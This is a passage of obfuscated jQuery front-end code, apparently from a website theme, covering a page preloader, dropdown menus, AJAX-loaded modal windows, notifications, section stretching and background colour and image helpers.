                ["removeClass"](_0x31626c(0x278)),
                _0x4381fa[_0x31626c(0x21c)] &&
                  _0x41b915[_0x31626c(0x355)][_0x31626c(0x302)](
                    _0x41b915[_0x31626c(0x1ec)]["showClass"],
                  ));
            else
              _0x23bfe8[_0x31626c(0x23e)]() <
                _0x41b915["config"]["breakpoint"] &&
                _0x41b915[_0x31626c(0x355)]["hasClass"](
                  _0x41b915[_0x31626c(0x1ec)][_0x31626c(0x333)] + "inview",
                ) &&
                (_0x41b915[_0x31626c(0x355)]["removeClass"](
                  _0x41b915["config"]["cssPrefix"] + _0x31626c(0x2c7),
                ),
                !_0x4381fa[_0x31626c(0x21c)]
                  ? _0x41b915[_0x31626c(0x355)][_0x31626c(0x302)](
                      _0x31626c(0x278),
                    )
                  : _0x41b915[_0x31626c(0x355)]
                      [
                        _0x31626c(0x29f)
                      ](_0x41b915[_0x31626c(0x1ec)]["showClass"])
                      [
                        _0x31626c(0x302)
                      ](_0x41b915["config"][_0x31626c(0x1dd)]));
          },
        };
      return (_0x1326b8[_0x57feef(0x308)](_0x3c74f9), this);
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x21a)] = function () {
      var _0x2bcd2f = _0x363537,
        _0x1a8e11 = _0x56c55d(_0x2bcd2f(0x289)),
        _0x1448f9 = parseInt(
          _0x1a8e11[_0x2bcd2f(0x12a)](_0x2bcd2f(0x2b0)),
          0xa,
        ),
        _0x2f1e61 = parseInt(_0x1a8e11["css"](_0x2bcd2f(0x201)), 0xa),
        _0x207356 = _0x56c55d(window),
        _0x4fff78 = _0x56c55d(_0x2bcd2f(0x1ae));
      _0x4fff78["length"] &&
        _0x4fff78["off"]("click.MadPreloader")["on"](
          "click.MadPreloader",
          "a",
          function (_0x4d97a3) {
            var _0xb3bae0 = _0x2bcd2f,
              _0x584c6d = _0x56c55d(this),
              _0x253b41 = _0x56c55d(_0xb3bae0(0x31a), {
                style:
                  _0xb3bae0(0x203) +
                  _0x4d97a3[_0xb3bae0(0x31e)] +
                  "px;\x20top:\x20" +
                  _0x4d97a3[_0xb3bae0(0x1e8)] +
                  _0xb3bae0(0x13a),
                class: "mad-preloader-circle",
              });
            _0x4defa9[_0xb3bae0(0x307)](_0xb3bae0(0x1ad)) &&
              (_0x253b41[_0xb3bae0(0x216)](_0x4defa9),
              setTimeout(function () {
                var _0x1a4719 = _0xb3bae0;
                _0x253b41[_0x1a4719(0x302)]("mad-preloader-circle--appearing");
              }, 0x14));
          },
        );
      if (!_0x1a8e11["length"]) return;
      _0x4defa9[_0x2bcd2f(0x2db)]("mousemove.MadPreloader")
        ["on"](_0x2bcd2f(0x27d), function (_0x505012) {
          var _0x1fe8e9 = _0x2bcd2f;
          _0x1a8e11["css"]({
            "margin-left":
              _0x1448f9 -
              (_0x207356["width"]() / 0x2 - _0x505012[_0x1fe8e9(0x246)]),
            "margin-top":
              _0x2f1e61 -
              (_0x207356[_0x1fe8e9(0x2e2)]() / 0x2 -
                (_0x505012[_0x1fe8e9(0x153)] - _0x207356["scrollTop"]())),
          });
        })
        [_0x2bcd2f(0x1e7)]()
        [_0x2bcd2f(0x1aa)](function () {
          var _0x3fd375 = _0x2bcd2f;
          (_0x1a8e11["addClass"](_0x3fd375(0x296)),
            setTimeout(function () {
              var _0x23c05b = _0x3fd375;
              (_0x1a8e11["remove"](),
                _0x4defa9[_0x23c05b(0x2db)](_0x23c05b(0x27d)));
            }, 0x2bc),
            window["location"][_0x3fd375(0x332)] == _0x3fd375(0x208) &&
              _0x56c55d("html,\x20body")
                [_0x3fd375(0x245)]()
                [_0x3fd375(0x1c8)](
                  { scrollTop: _0x455ae7["height"]() },
                  {
                    duration: self[_0x3fd375(0x247)],
                    easing: self[_0x3fd375(0x2aa)],
                  },
                ));
        });
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x1fe)] = {}),
    (_0x4381fa[_0x363537(0x130)]["dropdown"][_0x363537(0x1ec)] = {
      uncloseable: ".mad-dropdown,\x20.select2-container--mad",
      cssPrefix: _0x363537(0x30c),
      availableError: 0x1e,
      rtl: _0x4381fa[_0x363537(0x319)],
      classMap: {
        active: _0x363537(0x287),
        container: _0x363537(0x1fe),
        title: _0x363537(0x2e9),
        element: _0x363537(0x1a9),
        leftPlaced: _0x363537(0x151),
        rightPlaced: "dropdown-element--x-right",
        topPlaced: _0x363537(0x156),
      },
    }),
    (_0x4381fa[_0x363537(0x130)]["dropdown"][_0x363537(0x308)] = function (
      _0x2504ad,
    ) {
      var _0x5a3682 = _0x363537;
      if (this[_0x5a3682(0x215)]) return;
      if (_0x56c55d[_0x5a3682(0x34c)](_0x2504ad))
        _0x56c55d[_0x5a3682(0x270)](!![], this[_0x5a3682(0x1ec)], _0x2504ad);
      (Object[_0x5a3682(0x144)](this, {
        activeClass: {
          get: function () {
            var _0x594cea = _0x5a3682;
            return (
              this[_0x594cea(0x1ec)][_0x594cea(0x333)] +
              this["config"]["classMap"][_0x594cea(0x1ea)]
            );
          },
        },
        containerClass: {
          get: function () {
            var _0x158a07 = _0x5a3682;
            return (
              this[_0x158a07(0x1ec)][_0x158a07(0x333)] +
              this[_0x158a07(0x1ec)]["classMap"][_0x158a07(0x2a8)]
            );
          },
        },
        titleClass: {
          get: function () {
            var _0x57d161 = _0x5a3682;
            return (
              this[_0x57d161(0x1ec)]["cssPrefix"] +
              this[_0x57d161(0x1ec)][_0x57d161(0x214)][_0x57d161(0x2a6)]
            );
          },
        },
        elementClass: {
          get: function () {
            var _0x53bd08 = _0x5a3682;
            return (
              this[_0x53bd08(0x1ec)][_0x53bd08(0x333)] +
              this["config"][_0x53bd08(0x214)][_0x53bd08(0x268)]
            );
          },
        },
        rightPlacedClass: {
          get: function () {
            var _0x2ce3d3 = _0x5a3682;
            return (
              this[_0x2ce3d3(0x1ec)]["cssPrefix"] +
              this[_0x2ce3d3(0x1ec)][_0x2ce3d3(0x214)][_0x2ce3d3(0x16b)]
            );
          },
        },
        leftPlacedClass: {
          get: function () {
            var _0x4e390b = _0x5a3682;
            return (
              this[_0x4e390b(0x1ec)][_0x4e390b(0x333)] +
              this[_0x4e390b(0x1ec)][_0x4e390b(0x214)][_0x4e390b(0x1f2)]
            );
          },
        },
        topPlacedClass: {
          get: function () {
            var _0x4f3811 = _0x5a3682;
            return (
              this[_0x4f3811(0x1ec)][_0x4f3811(0x333)] +
              this[_0x4f3811(0x1ec)][_0x4f3811(0x214)][_0x4f3811(0x29c)]
            );
          },
        },
        $dropdowns: {
          get: function () {
            return _0x56c55d("." + this["containerClass"]);
          },
        },
      }),
        this[_0x5a3682(0x138)]());
    }),
    (_0x4381fa[_0x363537(0x130)]["dropdown"][_0x363537(0x138)] = function () {
      var _0x80fead = _0x363537,
        _0x2da37b = this;
      (_0x455ae7["off"](_0x80fead(0x2de))
        ["on"](_0x80fead(0x2de), function (_0x592772) {
          var _0x10cf24 = _0x80fead,
            _0x3c7782 = _0x56c55d(_0x592772[_0x10cf24(0x30d)]);
          !_0x3c7782["closest"](_0x2da37b[_0x10cf24(0x1ec)][_0x10cf24(0x15a)])[
            _0x10cf24(0x2c0)
          ] && _0x2da37b["close"](_0x2da37b[_0x10cf24(0x1f9)]);
        })
        ["on"](_0x80fead(0x359), function (_0x51fde3) {
          var _0x5942c6 = _0x80fead;
          _0x51fde3[_0x5942c6(0x2af)] &&
            _0x51fde3[_0x5942c6(0x2af)] == 0x1b &&
            _0x2da37b[_0x5942c6(0x23b)](_0x2da37b[_0x5942c6(0x1f9)]);
        }),
        _0x4defa9[_0x80fead(0x2db)]("click.MadDropdown")["on"](
          _0x80fead(0x2de),
          "." + _0x2da37b[_0x80fead(0x212)],
          function (_0x545213) {
            var _0x499d1e = _0x80fead,
              _0x5432e0 = _0x56c55d(this)[_0x499d1e(0x292)](
                "." + _0x2da37b[_0x499d1e(0x198)],
              ),
              _0x3d285e =
                _0x2da37b[_0x499d1e(0x1f9)][_0x499d1e(0x310)](_0x5432e0);
            (_0x5432e0[_0x499d1e(0x2c0)] &&
              (_0x2da37b["toggle"](_0x5432e0), _0x545213[_0x499d1e(0x137)]()),
              _0x2da37b["close"](_0x3d285e));
          },
        ),
        (this[_0x80fead(0x215)] = !![]));
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x1fe)][_0x363537(0x23b)] =
      function (_0x1ec565) {
        var _0x384b68 = _0x363537;
        if (!_0x56c55d["isjQuery"](_0x1ec565, !![])) return;
        _0x1ec565["removeClass"](this[_0x384b68(0x1c2)])
          [_0x384b68(0x1bd)]("." + this[_0x384b68(0x1c7)])
          [_0x384b68(0x2cd)](_0x384b68(0x1f1), _0x384b68(0x2f7))
          [_0x384b68(0x30b)]()
          [_0x384b68(0x1bd)]("." + this["titleClass"])
          [_0x384b68(0x2cd)](_0x384b68(0x326), _0x384b68(0x22b));
      }),
    (_0x4381fa[_0x363537(0x130)]["dropdown"][_0x363537(0x196)] = function (
      _0x29296e,
    ) {
      var _0x4b73f5 = _0x363537;
      if (!_0x56c55d["isjQuery"](_0x29296e, !![])) return;
      (this["fixPosition"](_0x29296e),
        _0x29296e[_0x4b73f5(0x302)](this[_0x4b73f5(0x1c2)])
          [_0x4b73f5(0x1bd)]("." + this[_0x4b73f5(0x1c7)])
          [_0x4b73f5(0x2cd)](_0x4b73f5(0x1f1), _0x4b73f5(0x22b))
          [_0x4b73f5(0x30b)]()
          [_0x4b73f5(0x1bd)]("." + this["titleClass"])
          [_0x4b73f5(0x2cd)](_0x4b73f5(0x326), "true"));
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x1fe)][_0x363537(0x329)] =
      function (_0x15c834) {
        var _0x122412 = _0x363537,
          _0x2b9ffe = this,
          _0x2fd63f = _0x56c55d(window);
        if (!_0x56c55d["isjQuery"](_0x15c834, !![])) return;
        return _0x15c834[_0x122412(0x24d)](function (_0xf0b4e1, _0x1b404a) {
          var _0x5d07d0 = _0x122412,
            _0xf5ae59 = _0x56c55d(_0x1b404a),
            _0x1c7196 = _0xf5ae59[_0x5d07d0(0x1bd)](
              "." + _0x2b9ffe[_0x5d07d0(0x1c7)],
            ),
            _0x530e9b;
          (_0x1c7196[_0x5d07d0(0x29f)](_0x2b9ffe[_0x5d07d0(0x163)])
            [_0x5d07d0(0x29f)](_0x2b9ffe[_0x5d07d0(0x35b)])
            [_0x5d07d0(0x29f)](_0x2b9ffe["topPlacedClass"]),
            (_0x530e9b = _0x1c7196[_0x5d07d0(0x1a2)]()));
          if (
            _0x530e9b[_0x5d07d0(0x1ab)] -
              _0x2b9ffe["config"][_0x5d07d0(0x1dc)] <
            0x0
          )
            _0x1c7196["addClass"](_0x2b9ffe[_0x5d07d0(0x163)]);
          else
            _0x530e9b["left"] +
              _0x1c7196[_0x5d07d0(0x25a)]() +
              _0x2b9ffe[_0x5d07d0(0x1ec)][_0x5d07d0(0x1dc)] >
              _0x2fd63f["width"]() &&
              _0x1c7196[_0x5d07d0(0x302)](_0x2b9ffe["rightPlacedClass"]);
          _0x530e9b["top"] +
            _0x1c7196[_0x5d07d0(0x2c2)]() +
            _0x2b9ffe[_0x5d07d0(0x1ec)][_0x5d07d0(0x1dc)] >
            _0x2fd63f[_0x5d07d0(0x23e)]() + _0x2fd63f[_0x5d07d0(0x2e2)]() &&
            _0x1c7196["addClass"](_0x2b9ffe[_0x5d07d0(0x1d1)]);
        });
      }),
    (_0x4381fa[_0x363537(0x130)]["dropdown"][_0x363537(0x306)] = function (
      _0x4fd97f,
    ) {
      var _0x530bfb = _0x363537;
      if (!_0x56c55d[_0x530bfb(0x30f)](_0x4fd97f, !![])) return;
      var _0x3a28fa = this;
      return _0x4fd97f[_0x530bfb(0x24d)](function (_0x159782, _0x5bcff6) {
        var _0x25eda0 = _0x530bfb,
          _0x553cf9 = _0x56c55d(_0x5bcff6);
        if (_0x553cf9[_0x25eda0(0x307)](_0x3a28fa[_0x25eda0(0x1c2)]))
          _0x3a28fa[_0x25eda0(0x23b)](_0x553cf9);
        else _0x3a28fa[_0x25eda0(0x196)](_0x553cf9);
      });
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x2b2)] = {
      _config: {
        type: "html",
        closeOnOverlayClick: !![],
        overlay: { css: { backgroundColor: "#000000" } },
        clickableElements: null,
      },
      _collection: _0x56c55d(),
      init: function (_0x3ffb78, _0x1f7133) {
        var _0x471771 = _0x363537;
        if (!_0x3ffb78 || !_0x3ffb78[_0x471771(0x2c0)]) return;
        ((_0x1f7133 = _0x56c55d["isPlainObject"](_0x1f7133)
          ? _0x56c55d[_0x471771(0x270)](
              !![],
              {},
              this[_0x471771(0x342)],
              _0x1f7133,
            )
          : this["_config"]),
          (_0x1f7133 = this[_0x471771(0x1ba)](_0x1f7133)),
          _0x1f7133 &&
            _0x1f7133["clickableElements"] &&
            _0x4defa9["on"](
              "click.MadArcticModals",
              ".arcticmodal-container",
              function (_0x3f5461) {
                var _0x1fb8ae = _0x471771,
                  _0x56c2a7 = _0x56c55d(_0x3f5461[_0x1fb8ae(0x30d)]);
                !_0x56c2a7[_0x1fb8ae(0x292)](_0x1f7133[_0x1fb8ae(0x20d)])[
                  "length"
                ] && _0x56c55d[_0x1fb8ae(0x210)](_0x1fb8ae(0x23b));
              },
            ),
          _0x3ffb78["on"](_0x471771(0x2ff), function (_0x4e4e42) {
            var _0x220eae = _0x471771,
              _0xb89b11 = _0x56c55d(this);
            if (_0xb89b11[_0x220eae(0x2ab)](_0x220eae(0x2fe)) == "ajax") {
              if (!_0xb89b11[_0x220eae(0x2ab)](_0x220eae(0x2e5))) return;
              _0x56c55d[_0x220eae(0x210)](
                _0x56c55d[_0x220eae(0x270)](!![], {}, _0x1f7133, {
                  type: _0x220eae(0x2d8),
                  url: MadAJAXData[_0x220eae(0x1fa)],
                  ajax: {
                    cache: ![],
                    dataType: "html",
                    data: {
                      action: _0xb89b11[_0x220eae(0x2ab)](_0x220eae(0x2e5)),
                      data: _0xb89b11[_0x220eae(0x2ab)](_0x220eae(0x149)),
                      AJAX_token: MadAJAXData[_0x220eae(0x2ce)],
                    },
                    success: function (_0x3b9014, _0x1af00e, _0x243098) {
                      var _0x4cbfc9 = _0x220eae;
                      _0x3b9014[_0x4cbfc9(0x1a4)]["html"](_0x243098);
                    },
                  },
                }),
              );
            } else
              _0x56c55d(_0xb89b11[_0x220eae(0x2ab)](_0x220eae(0x322)))[
                _0x220eae(0x210)
              ](_0x1f7133);
            _0x4e4e42["preventDefault"]();
          }));
      },
      _prepareCallbacks: function (_0xc61178) {
        var _0x7b534c = _0x363537,
          _0x134ed3 = _0xc61178[_0x7b534c(0x298)] || function () {},
          _0x2c8984 = _0xc61178[_0x7b534c(0x17b)] || function () {},
          _0x56cc36 = _0xc61178[_0x7b534c(0x1e0)] || function () {},
          _0x3da33f = _0xc61178[_0x7b534c(0x2b7)] || function () {};
        return (
          (_0xc61178["beforeOpen"] = function () {
            var _0x5caff8 = _0x7b534c;
            _0x134ed3[_0x5caff8(0x2e4)](
              this,
              Array[_0x5caff8(0x336)]["slice"](arguments, 0x0),
            );
          }),
          (_0xc61178[_0x7b534c(0x17b)] = function (_0x465e3b) {
            var _0x491033 = _0x7b534c;
            _0x2c8984["apply"](
              this,
              Array[_0x491033(0x336)][_0x491033(0x313)](arguments, 0x0),
            );
          }),
          (_0xc61178[_0x7b534c(0x2b7)] = function (_0x5b42d9) {
            var _0x515920 = _0x7b534c;
            (_0x4defa9[_0x515920(0x12a)](_0x515920(0x15e), ""),
              _0x3da33f[_0x515920(0x2e4)](
                this,
                Array[_0x515920(0x336)][_0x515920(0x313)](arguments, 0x0),
              ));
          }),
          _0xc61178
        );
      },
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x1a0)] = function (_0x27845c) {
      var _0x3388eb = _0x363537;
      if (!(_0x3388eb(0x29b) in window)) return;
      var _0x5ace79 = {
        target: _0x4defa9[_0x3388eb(0x199)]()[_0x3388eb(0x1e3)](),
        type: _0x3388eb(0x25e),
        timeout: 0xfa0,
      };
      _0x5ace79 =
        _0x27845c && _0x56c55d[_0x3388eb(0x34c)](_0x27845c)
          ? _0x56c55d[_0x3388eb(0x270)](!![], {}, _0x5ace79, _0x27845c)
          : _0x5ace79;
      var _0xba26e7 = _0x3388eb(0x1ff),
        _0x6e6b95 = _0x56c55d(Handlebars["compile"](_0xba26e7)(_0x5ace79));
      _0x6e6b95[_0x3388eb(0x2ab)](
        "timeOut",
        setTimeout(function () {
          var _0x32926f = _0x3388eb;
          _0x6e6b95[_0x32926f(0x245)]()[_0x32926f(0x354)]({
            duration: 0x15e,
            easing: _0x32926f(0x2cc),
            complete: function () {
              var _0x33f1f4 = _0x32926f;
              _0x56c55d(this)[_0x33f1f4(0x16c)]();
            },
          });
        }, _0x5ace79["timeout"]),
      )
        [_0x3388eb(0x286)](_0x5ace79["target"])
        [_0x3388eb(0x245)]()
        [_0x3388eb(0x1fc)]({ duration: 0x15e, easing: "linear" });
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)] = {}),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)]["_$collection"] =
      _0x56c55d()),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)][_0x363537(0x1ec)] = {
      cssPrefix: _0x363537(0x30c),
      resizeDelay: 0xa,
      boddyPaddings: ![],
      classMap: {
        loading: _0x363537(0x2da),
        stretched: _0x363537(0x1b8),
        stretchedContent: _0x363537(0x258),
        stretchedContentNoPadding: _0x363537(0x211),
        bgColorElementClass: _0x363537(0x26a),
        bgImageElementClass: "colorizer-bg-image",
      },
    }),
    Object[_0x363537(0x144)](_0x4381fa[_0x363537(0x130)][_0x363537(0x183)], {
      bgColorElementClass: {
        get: function () {
          var _0x27d5d3 = _0x363537;
          return (
            this[_0x27d5d3(0x1ec)]["cssPrefix"] +
            this[_0x27d5d3(0x1ec)]["classMap"]["bgColorElementClass"]
          );
        },
      },
      bgImageElementClass: {
        get: function () {
          var _0x3dd865 = _0x363537;
          return (
            this[_0x3dd865(0x1ec)]["cssPrefix"] +
            this[_0x3dd865(0x1ec)][_0x3dd865(0x214)][_0x3dd865(0x2dd)]
          );
        },
      },
      stretchedClass: {
        get: function () {
          var _0x136e20 = _0x363537;
          return (
            this[_0x136e20(0x1ec)][_0x136e20(0x333)] +
            this[_0x136e20(0x1ec)][_0x136e20(0x214)][_0x136e20(0x145)]
          );
        },
      },
      stretchedContentClass: {
        get: function () {
          var _0x5f060b = _0x363537;
          return (
            this[_0x5f060b(0x1ec)][_0x5f060b(0x333)] +
            this[_0x5f060b(0x1ec)][_0x5f060b(0x214)][_0x5f060b(0x293)]
          );
        },
      },
      stretchedContentNoPaddingClass: {
        get: function () {
          var _0x468599 = _0x363537;
          return (
            this["config"]["cssPrefix"] +
            this[_0x468599(0x1ec)][_0x468599(0x214)][
              "stretchedContentNoPadding"
            ]
          );
        },
      },
      loadingClass: {
        get: function () {
          var _0x30f3ea = _0x363537;
          return (
            this[_0x30f3ea(0x1ec)][_0x30f3ea(0x333)] +
            this[_0x30f3ea(0x1ec)]["classMap"][_0x30f3ea(0x1b0)]
          );
        },
      },
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)]["changeConfig"] = function (
      _0x148663,
    ) {
      var _0x58b5b6 = _0x363537;
      return _0x56c55d["extend"](!![], this[_0x58b5b6(0x1ec)], _0x148663);
    }),
    (_0x4381fa["modules"]["Section"][_0x363537(0x308)] = function (_0x17dfb6) {
      var _0x4c22f6 = _0x363537,
        _0x2ecd11 = this;
      if (!_0x56c55d[_0x4c22f6(0x30f)](_0x17dfb6, !![])) return;
      if (!this[_0x4c22f6(0x1a7)]) this["_bindGlobalEvents"]();
      return _0x17dfb6[_0x4c22f6(0x24d)](function (_0x177813, _0x5a4430) {
        var _0x3902cf = _0x4c22f6,
          _0x1d572 = _0x56c55d(_0x5a4430);
        if (
          _0x2ecd11[_0x3902cf(0x240)][_0x3902cf(0x1d6)](_0x1d572)[
            _0x3902cf(0x2c0)
          ]
        )
          return;
        (_0x2ecd11[_0x3902cf(0x1d5)](_0x1d572),
          (_0x2ecd11[_0x3902cf(0x240)] =
            _0x2ecd11[_0x3902cf(0x240)][_0x3902cf(0x184)](_0x1d572)));
      });
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)][_0x363537(0x23a)] =
      function () {
        var _0x27b967 = this;
        _0x56c55d(window)["on"]("resize.App.modules.Section", function () {
          var _0x99e02c = _0x381b;
          if (_0x27b967[_0x99e02c(0x17c)])
            clearTimeout(_0x27b967[_0x99e02c(0x17c)]);
          _0x27b967["_resizeTimeOutId"] = setTimeout(function () {
            var _0x2374d7 = _0x99e02c;
            _0x27b967[_0x2374d7(0x1b7)]();
          }, _0x27b967["config"]["resizeDelay"]);
        });
      }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)]["rebuild"] = function () {
      var _0x3c98be = _0x363537,
        _0x586db3 = this;
      return this[_0x3c98be(0x240)]["each"](function (_0x41b3b6, _0x27395c) {
        var _0x540faa = _0x3c98be,
          _0x20131e = _0x56c55d(_0x27395c);
        _0x586db3[_0x540faa(0x266)](_0x20131e)[_0x540faa(0x1d5)](_0x20131e);
      });
    }),
    (_0x4381fa[_0x363537(0x130)]["Section"][_0x363537(0x266)] = function (
      _0x431353,
    ) {
      var _0x6a23bd = _0x363537;
      if (!_0x56c55d[_0x6a23bd(0x30f)](_0x431353, !![])) return;
      return (
        _0x431353["css"]({ "margin-left": "", "margin-right": "" }),
        this
      );
    }),
    (_0x4381fa["modules"][_0x363537(0x183)][_0x363537(0x1d5)] = function (
      _0x4bf7eb,
    ) {
      var _0x2b8c5b = _0x363537;
      if (!_0x56c55d[_0x2b8c5b(0x30f)](_0x4bf7eb, !![])) return;
      if (_0x4bf7eb["hasClass"](this[_0x2b8c5b(0x131)]))
        this["stretch"](_0x4bf7eb);
      else
        (_0x4bf7eb[_0x2b8c5b(0x307)](this[_0x2b8c5b(0x328)]) ||
          _0x4bf7eb["hasClass"](this["stretchedContentNoPaddingClass"])) &&
          this[_0x2b8c5b(0x27c)](_0x4bf7eb);
      return this;
    }),
    (_0x4381fa[_0x363537(0x130)]["Section"][_0x363537(0x25d)] = function () {
      var _0x3c33f1 = _0x363537;
      return {
        "padding-left": parseInt(_0x4defa9["css"](_0x3c33f1(0x155)), 0xa),
        "padding-right": parseInt(
          _0x4defa9[_0x3c33f1(0x12a)](_0x3c33f1(0x264)),
          0xa,
        ),
      };
    }),
    (_0x4381fa["modules"][_0x363537(0x183)]["stretch"] = function (_0x49c796) {
      var _0x22a866 = _0x363537,
        _0x53e094,
        _0x42cc56,
        _0x4ac8ba;
      if (!_0x56c55d[_0x22a866(0x30f)](_0x49c796, !![])) return;
      _0x53e094 = _0x49c796[_0x22a866(0x1bd)](
        "." +
          this[_0x22a866(0x213)] +
          _0x22a866(0x190) +
          this[_0x22a866(0x2dd)],
      );
      if (!_0x53e094[_0x22a866(0x2c0)]) return;
      return (
        (_0x42cc56 = _0x49c796[_0x22a866(0x1a2)]()[_0x22a866(0x1ab)]),
        (_0x4ac8ba = this[_0x22a866(0x25d)]()),
        _0x42cc56 > 0x0 &&
          _0x53e094[_0x22a866(0x12a)]({
            left: (_0x42cc56 - _0x4ac8ba[_0x22a866(0x155)]) / -0x1,
            right: (_0x42cc56 - _0x4ac8ba[_0x22a866(0x264)]) / -0x1,
          }),
        _0x49c796[_0x22a866(0x29f)](this["loadingClass"])[_0x22a866(0x316)](
          _0x22a866(0x200),
          [_0x49c796],
        ),
        _0x49c796
      );
    }),
    (_0x4381fa[_0x363537(0x130)][_0x363537(0x183)][_0x363537(0x27c)] =
      function (_0x1b8111) {
        var _0x578639 = _0x363537,
          _0x48379a,
          _0x458cf0;
        if (
          !_0x56c55d[_0x578639(0x30f)](_0x1b8111) ||
          !_0x1b8111[_0x578639(0x2c0)]
        )
          return;
        return (
          (_0x48379a = _0x1b8111[_0x578639(0x1a2)]()["left"]),
          (_0x458cf0 = this[_0x578639(0x25d)]()),
          _0x48379a > 0x0 &&
            _0x1b8111[_0x578639(0x12a)]({
              "margin-left": (_0x48379a - _0x458cf0[_0x578639(0x155)]) / -0x1,
              "margin-right": (_0x48379a - _0x458cf0[_0x578639(0x264)]) / -0x1,
            }),
          _0x1b8111["removeClass"](this[_0x578639(0x2d1)])["trigger"](
            "stretched.mad.Section",
            [_0x1b8111],
          ),
          _0x1b8111
        );
      }),
    (_0x4381fa["helpers"][_0x363537(0x32f)] = {}),
    (_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)][_0x363537(0x1ec)] = {
      cssPrefix: "mad-",
      classMap: {
        bgColorElement: _0x363537(0x26a),
        bgImageElement: _0x363537(0x346),
        parallax: _0x363537(0x1cf),
      },
      afterInit: function () {},
    }),
    Object[_0x363537(0x144)](_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)], {
      bgColorElementClass: {
        get: function () {
          var _0x128e4e = _0x363537;
          return (
            this[_0x128e4e(0x1ec)][_0x128e4e(0x333)] +
            this[_0x128e4e(0x1ec)]["classMap"][_0x128e4e(0x206)]
          );
        },
      },
      bgImageElementClass: {
        get: function () {
          var _0x2d61ae = _0x363537;
          return (
            this[_0x2d61ae(0x1ec)]["cssPrefix"] +
            this[_0x2d61ae(0x1ec)]["classMap"][_0x2d61ae(0x160)]
          );
        },
      },
      parallaxClass: {
        get: function () {
          var _0x862a99 = _0x363537;
          return (
            this[_0x862a99(0x1ec)]["cssPrefix"] +
            this[_0x862a99(0x1ec)][_0x862a99(0x214)][_0x862a99(0x20e)]
          );
        },
      },
    }),
    (_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)]["init"] = function (
      _0x583c27,
      _0x2201c9,
    ) {
      var _0x3f357e = _0x363537,
        _0x6bec68 = this;
      if (!_0x56c55d[_0x3f357e(0x30f)](_0x583c27, !![])) return _0x583c27;
      return (
        (this[_0x3f357e(0x1ec)] = _0x56c55d[_0x3f357e(0x270)](
          !![],
          {},
          this[_0x3f357e(0x1ec)],
          _0x2201c9,
        )),
        _0x583c27[_0x3f357e(0x24d)](function (_0x4320b8, _0x2dc74e) {
          var _0x8f67aa = _0x3f357e,
            _0x4300d4 = _0x56c55d(_0x2dc74e);
          (!_0x6bec68[_0x8f67aa(0x263)](_0x4300d4) &&
            _0x6bec68[_0x8f67aa(0x248)](_0x4300d4),
            !_0x6bec68[_0x8f67aa(0x2f8)](_0x4300d4) &&
              _0x4300d4[_0x8f67aa(0x2ab)](_0x8f67aa(0x259)) &&
              _0x6bec68[_0x8f67aa(0x179)](_0x4300d4));
        }),
        this["config"]["afterInit"][_0x3f357e(0x17d)](this),
        _0x583c27
      );
    }),
    (_0x4381fa["helpers"]["Colorizer"][_0x363537(0x263)] = function (
      _0x3b278b,
    ) {
      var _0x4e6cab = _0x363537;
      return _0x3b278b[_0x4e6cab(0x199)]("." + this["bgColorElementClass"])[
        "length"
      ];
    }),
    (_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)][_0x363537(0x2f8)] =
      function (_0x32c27f) {
        var _0x213edc = _0x363537;
        return _0x32c27f[_0x213edc(0x199)]("." + this["bgImageElementClass"])[
          "length"
        ];
      }),
    (_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)]["appendBGColorElement"] =
      function (_0x3df372) {
        var _0x1396c0 = _0x363537,
          _0x1f66b8 = this,
          _0x5c13c6 = _0x56c55d(_0x1396c0(0x31a), {
            class: _0x1f66b8[_0x1396c0(0x213)],
          });
        return _0x3df372["prepend"](_0x5c13c6);
      }),
    (_0x4381fa[_0x363537(0x23f)][_0x363537(0x32f)][_0x363537(0x179)] =
      function (_0x4df5db) {
        var _0x55ffea = _0x363537,
          _0x1fa78f = this,
          _0x26cd88 = _0x4df5db[_0x55ffea(0x2ab)]("bg-image-src"),
          _0x98b4f7 = _0x56c55d("<div></div>", {
            class: _0x1fa78f[_0x55ffea(0x2dd)],
          });
        return (
          _0x98b4f7["css"](
            _0x55ffea(0x229),
            _0x55ffea(0x2ec) + _0x26cd88 + "\x22)",
          ),
          _0x4df5db[_0x55ffea(0x1e5)](_0x98b4f7),
          _0x4df5db
        );
      }),
    (_0x4381fa["helpers"][_0x363537(0x221)] = function (_0x2aa608) {
      var _0x26b830 = _0x363537,
        _0x8e3773 = {
          after: "",
          before: "",
          content: "",
          cssPrefix: _0x26b830(0x30c),
          cssClass: "",
        },
        _0x474f75 = _0x26b830(0x139);
      _0x2aa608 = _0x56c55d[_0x26b830(0x270)](_0x8e3773, _0x2aa608);
      for (var _0x182eaf in _0x2aa608) {
        _0x474f75 = _0x474f75[_0x26b830(0x24f)](
          new RegExp("%" + _0x182eaf + "%", "g"),
          _0x2aa608[_0x182eaf],
        );
      }
      _0x4defa9["html"]("")
        [_0x26b830(0x302)](_0x2aa608["cssPrefix"] + _0x26b830(0x35c))
        [_0x26b830(0x279)](_0x474f75);
    }),
    ((_0x4381fa[_0x363537(0x23f)][_0x363537(0x2b5)] = function (_0x1c57fe) {
      var _0x15bdd9 = _0x363537;
      _0x1c57fe = _0x56c55d[_0x15bdd9(0x30f)](_0x1c57fe)
        ? _0x1c57fe
        : _0x56c55d(_0x15bdd9(0x31f));
      if (!_0x1c57fe[_0x15bdd9(0x2c0)]) return;
      return _0x1c57fe["each"](function (_0x245f59, _0x207342) {
        var _0x224eb1 = _0x15bdd9,
          _0x2d0532 = _0x56c55d(_0x207342);
        if (!_0x2d0532[_0x224eb1(0x2ab)](_0x224eb1(0x259))) return;
        _0x2d0532[_0x224eb1(0x12a)](
          "background-image",
          _0x224eb1(0x2ec) +
            _0x2d0532[_0x224eb1(0x2ab)]("bg-image-src") +
            "\x22)",
